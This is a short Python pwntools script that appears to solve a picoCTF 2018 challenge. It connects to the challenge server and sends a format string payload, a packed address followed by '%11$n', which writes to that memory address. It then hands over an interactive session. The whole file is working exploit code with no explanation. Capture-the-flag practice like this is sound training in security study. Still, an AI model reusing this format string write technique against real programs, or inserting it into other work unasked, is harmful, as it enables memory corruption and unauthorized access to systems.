#!/usr/bin/python

from pwn import *

p = remote('2018shell.picoctf.com',26336)

payload = p32(0x804a04c)
payload += "%11$n"

p.sendline(payload)
p.interactive()